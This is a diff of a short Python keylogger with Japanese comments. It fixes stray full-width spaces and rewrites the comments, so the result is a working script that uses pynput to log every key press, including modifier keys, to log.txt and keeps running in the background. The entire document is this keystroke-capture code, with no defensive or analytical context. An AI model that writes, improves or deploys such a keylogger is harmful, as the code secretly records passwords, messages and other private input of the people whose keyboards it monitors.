@@ -1,13 +1,12 @@
-from pynput import keyboard #モジュールpynput
+from pynput import keyboard  # モジュールpynputをインポート
 
-def on_press(key):#関数　キーロガーのメインロジック
+def on_press(key):  # キーが押されたときに呼ばれる関数
     try:
-        with open("log.txt", "a")　 as f: #ログをTextとして生成
+        with open("log.txt", "a") as f:  # ログファイルを追記モードで開く
+            f.write(str(key.char))  # 通常の文字キーを文字列として書き出す
+    except AttributeError:  # 修飾キー（Shift, Ctrl, Enterなど）はchar属性がない
+        with open("log.txt", "a") as f:
+            f.write(str(key))  # 修飾キーはそのまま文字列で記録
 
-            f.write(str(key.char)) #生のキー入力を文字列に変換
-    except AttributeError: #異種のキー入力エラー
-        with open("log.txt", "a") as f: #そのままログとして出力　fは一時的な変数
-            f.write(str(key))　#生のキー入力を文字列として出力
-
-with keyboard.Listener(on_press=on_press) as listener:　#動き続けるためのロジック
-    listener.join()
+with keyboard.Listener(on_press=on_press) as listener:  # キーボードイベントを監視
+    listener.join()  # イベントが終了するまで待機（常駐）
